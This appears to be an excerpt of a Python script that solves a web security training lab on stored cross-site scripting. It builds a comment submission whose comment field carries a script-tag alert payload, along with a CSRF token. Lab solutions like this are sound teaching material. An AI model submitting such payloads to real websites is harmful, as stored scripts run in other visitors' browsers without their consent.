...
parser = argparse.ArgumentParser(description='Solves the following Lab: Stored XSS into HTML context with nothing encoded')
...
data={'csrf':csrf,'postId':'1','comment':'<script>alert("XSS")</script>','name':'Stored XSS','email':'xss@xss.com'}
